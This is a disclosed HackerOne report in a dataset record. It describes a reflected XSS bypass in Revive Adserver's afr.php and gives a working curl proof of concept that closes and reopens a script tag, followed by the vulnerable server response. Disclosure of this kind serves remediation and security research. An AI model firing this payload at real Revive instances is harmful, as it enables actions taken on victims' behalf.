---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '986365'
original_report_id: '986365'
title: 'Reflected XSS on /www/delivery/afr.php (bypass of report #775693)'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: revive_adserver
created_at: '2020-09-19T23:56:40.221Z'
disclosed_at: '2021-01-19T15:30:37.986Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 16
asset_identifier: https://github.com/revive-adserver/revive-adserver
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on /www/delivery/afr.php (bypass of report #775693)

## Metadata

- HackerOne Report ID: 986365
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: revive_adserver
- Disclosed At: 2021-01-19T15:30:37.986Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

It is possible to bypass the first fix of this XSS by closing the script tag, and then opening a new one. cURL PoC is trivial :

`curl "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>"`

The response will be :

```
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<title>Advertisement</title>

    <script type='text/javascript'><!--// <![CDATA[
        setTimeout('window.location.replace("https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>&loc=")', 10000000);
    // ]]> --></script><noscript><meta http-equiv='refresh' content='10000;url=https://revive-instance/www/delivery/afr.php?refresh=10000&amp;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;loc='></noscript>
    <style type='text/css'>
body {margin:0; height:100%; background-color:transparent; width:100%; text-align:center;}
</style>
</head>
<body>

</body>
</html>

## Impact

An attacker can perform arbitrary actions on behalf of the victim.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
